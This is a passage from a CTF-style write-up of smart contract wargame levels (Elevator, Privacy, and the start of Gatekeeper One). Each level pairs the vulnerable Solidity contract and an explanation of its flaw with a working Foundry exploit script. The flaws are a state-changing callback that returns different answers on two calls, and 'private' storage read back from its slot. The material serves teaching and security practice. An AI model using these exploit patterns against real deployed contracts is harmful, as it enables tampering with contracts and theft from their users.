<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">interface</span><span> </span><span class="token" style="color:#4ec9b0">Building</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">isLastFloor</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#569CD6">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bool</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Elevator</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>  </span><span class="token" style="color:#ce9178">bool</span><span> </span><span class="token" style="color:#569CD6">public</span><span> top</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#ce9178">uint</span><span> </span><span class="token" style="color:#569CD6">public</span><span> floor</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">goTo</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint</span><span> _floor</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    Building building </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">Building</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">!</span><span> building</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">isLastFloor</span><span class="token" style="color:#d4d4d4">(</span><span>_floor</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>      floor </span><span class="token" style="color:#d4d4d4">=</span><span> _floor</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>      top </span><span class="token" style="color:#d4d4d4">=</span><span> building</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">isLastFloor</span><span class="token" style="color:#d4d4d4">(</span><span>floor</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>Goal:</strong></p>
<p>We need to get to the top floor, i.e make the top boolean to <code>true</code>.</p>
<p><strong>Explanation:</strong></p>
<ol>
<li>The Elevator calling the <code>isLastFloor()</code> function on <code>msg.sender</code> which is insecure. Dont trust the unknown libraries or contract while making the calls.</li>
<li>The <code>top</code> variable is being updated upon the return value of the <code>isLastFloor()</code> function.</li>
<li>But, To pass the <code>if</code> condition the <code>isLastFloor()</code> should return the <code>false</code>. But the <code>top</code> will become <code>false</code> only if it results false everytime.</li>
<li>We can observe that the <code>isLastFloor()</code> function is being called twice. So, we can write a contract which implements <code>isLastFloor()</code> function in such a way that is returns <code>false</code> on first call and <code>true</code> on second call.</li>
<li>So, that the <code>if</code> condition satisfies and <code>top</code> will be updated to true.</li>
</ol>
<p><strong>Level11Solution.s.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;../src/Level11.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/Script.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/console.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Level11Sol</span><span> </span><span class="token" style="color:#569CD6">is</span><span> Script</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>     Elevator </span><span class="token" style="color:#569CD6">public</span><span> instance </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">Elevator</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0x8Ad804B2A6907983267C2ef6A962d50F5C63A694</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">run</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">startBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span>vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">envUint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;PRIVATE_KEY&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>         </span><span class="token" style="color:#569CD6">new</span><span> </span><span class="token" style="color:#4ec9b0">Attack</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">exploit</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">stopBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Attack</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    Elevator </span><span class="token" style="color:#569CD6">public</span><span> instance </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">Elevator</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0x8Ad804B2A6907983267C2ef6A962d50F5C63A694</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#ce9178">uint</span><span> </span><span class="token" style="color:#569CD6">public</span><span> floor</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">exploit</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">goTo</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">3</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">isLastFloor</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint</span><span> _floor</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#569CD6">returns</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bool</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">if</span><span class="token" style="color:#d4d4d4">(</span><span>floor </span><span class="token" style="color:#d4d4d4">==</span><span> _floor</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>            </span><span class="token" style="color:#569CD6">return</span><span> </span><span class="token" style="color:#569cd6">true</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>         floor </span><span class="token" style="color:#d4d4d4">=</span><span> _floor</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">return</span><span> </span><span class="token" style="color:#569cd6">false</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>To run the script</strong></p>
<pre><code>$ source .env
$ forge script script/Level11Solution.s.sol:Level11Sol --rpc-url $RPC_URL --broadcast
</code></pre>
<h2>Privacy</h2>
<p><strong>Level12.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Privacy</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>  </span><span class="token" style="color:#ce9178">bool</span><span> </span><span class="token" style="color:#569CD6">public</span><span> locked </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569cd6">true</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#ce9178">uint256</span><span> </span><span class="token" style="color:#569CD6">public</span><span> ID </span><span class="token" style="color:#d4d4d4">=</span><span> block</span><span class="token" style="color:#d4d4d4">.</span><span>timestamp</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#ce9178">uint8</span><span> </span><span class="token" style="color:#569CD6">private</span><span> flattening </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#b5cea8">10</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#ce9178">uint8</span><span> </span><span class="token" style="color:#569CD6">private</span><span> denomination </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#b5cea8">255</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#ce9178">uint16</span><span> </span><span class="token" style="color:#569CD6">private</span><span> awkwardness </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#ce9178">uint16</span><span class="token" style="color:#d4d4d4">(</span><span>block</span><span class="token" style="color:#d4d4d4">.</span><span>timestamp</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#ce9178">bytes32</span><span class="token" style="color:#d4d4d4">[</span><span class="token" style="color:#b5cea8">3</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#569CD6">private</span><span> data</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">constructor</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bytes32</span><span class="token" style="color:#d4d4d4">[</span><span class="token" style="color:#b5cea8">3</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#569CD6">memory</span><span> _data</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    data </span><span class="token" style="color:#d4d4d4">=</span><span> _data</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">unlock</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bytes16</span><span> _key</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>_key </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#ce9178">bytes16</span><span class="token" style="color:#d4d4d4">(</span><span>data</span><span class="token" style="color:#d4d4d4">[</span><span class="token" style="color:#b5cea8">2</span><span class="token" style="color:#d4d4d4">]</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    locked </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569cd6">false</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#6a9955">/*
</span><span class="token" style="color:#6a9955">    A bunch of super advanced solidity algorithms...
</span><span class="token" style="color:#6a9955">
</span><span class="token" style="color:#6a9955">      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`
</span><span class="token" style="color:#6a9955">      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,
</span><span class="token" style="color:#6a9955">      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)
</span><span class="token" style="color:#6a9955">      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU
</span><span class="token" style="color:#6a9955">  */</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></code></div></pre>
<p><strong>Goal:</strong></p>
<p>We need to unlock the contract, i.e call <code>unlock()</code> function with right password.</p>
<p><strong>Explanation:</strong></p>
<ol>
<li>
<p>This challenge is similar to <code>Vault</code>. But we need to understand the storage layout of this contract and query the exact passwor storage slot of the contract.</p>
</li>
<li>
<p>The storage layout of contract as follows :</p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>`</span><span class="token" style="color:#ce9178">bool</span><span> </span><span class="token" style="color:#569CD6">public</span><span> locked </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569cd6">true</span><span class="token" style="color:#d4d4d4">;</span><span>                                  </span><span class="token" style="color:#6a9955">// slot 0</span><span>
</span><span></span><span class="token" style="color:#ce9178">uint256</span><span> </span><span class="token" style="color:#569CD6">public</span><span> ID </span><span class="token" style="color:#d4d4d4">=</span><span> block</span><span class="token" style="color:#d4d4d4">.</span><span>timestamp</span><span class="token" style="color:#d4d4d4">;</span><span>                        </span><span class="token" style="color:#6a9955">// slot 1</span><span>
</span><span></span><span class="token" style="color:#ce9178">uint8</span><span> </span><span class="token" style="color:#569CD6">private</span><span> flattening </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#b5cea8">10</span><span class="token" style="color:#d4d4d4">;</span><span>                              </span><span class="token" style="color:#6a9955">// slot 2</span><span>
</span><span></span><span class="token" style="color:#ce9178">uint8</span><span> </span><span class="token" style="color:#569CD6">private</span><span> denomination </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#b5cea8">255</span><span class="token" style="color:#d4d4d4">;</span><span>                           </span><span class="token" style="color:#6a9955">// slot 2</span><span>
</span><span></span><span class="token" style="color:#ce9178">uint16</span><span> </span><span class="token" style="color:#569CD6">private</span><span> awkwardness </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#ce9178">uint16</span><span class="token" style="color:#d4d4d4">(</span><span>block</span><span class="token" style="color:#d4d4d4">.</span><span>timestamp</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>       </span><span class="token" style="color:#6a9955">// slot 2</span><span>
</span><span></span><span class="token" style="color:#ce9178">bytes32</span><span class="token" style="color:#d4d4d4">[</span><span class="token" style="color:#b5cea8">3</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#569CD6">private</span><span> data</span><span class="token" style="color:#d4d4d4">;</span><span>  </span><span class="token" style="color:#6a9955">// data[0] =&gt; slot 3`</span><span>
</span><span>                          </span><span class="token" style="color:#6a9955">// data[1] =&gt; slot 4&#x27;</span><span>
</span><span>                          </span><span class="token" style="color:#6a9955">// data[2] =&gt; slot 5`</span></code></div></pre>
</li>
<li>
<p>Password is the lower 16 bytes of the <code>data[2]</code>, i.e <code>require(_key == bytes16(data[2]));</code></p>
</li>
<li>
<p>Since the <code>data[2]</code> stored at slot 5, we can query it with <code>vm.load</code> cheatcode.</p>
</li>
<li>
<p>Calling unlock with this password will solve the challenge.</p>
</li>
</ol>
<p><strong>Level12Solution.s.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;../src/Level12.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/Script.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/console.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Level12Sol</span><span> </span><span class="token" style="color:#569CD6">is</span><span> Script</span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>    Privacy </span><span class="token" style="color:#569CD6">public</span><span> instance </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">Privacy</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0x80AeDd671Abb04118998A8baAd7B879aA53756f9</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">run</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">startBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span>vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">envUint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;PRIVATE_KEY&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#ce9178">bytes32</span><span> slot5_data </span><span class="token" style="color:#d4d4d4">=</span><span> vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">load</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>instance</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#ce9178">bytes32</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint256</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">5</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">unlock</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bytes16</span><span class="token" style="color:#d4d4d4">(</span><span>slot5_data</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">stopBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>To run the script</strong></p>
<pre><code>$ source .env
$ forge script script/Level12Solution.s.sol:Level12Sol --rpc-url $RPC_URL --broadcast
</code></pre>
<h2>Gatekeeper One</h2>
<p><strong>Level13.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">GatekeeperOne</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>  </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">public</span><span> entrant</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">modifier</span><span> </span><span class="token" style="color:#dcdcaa">gateOne</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender </span><span class="token" style="color:#d4d4d4">!=</span><span> tx</span><span class="token" style="color:#d4d4d4">.</span><span>origin</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">_</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
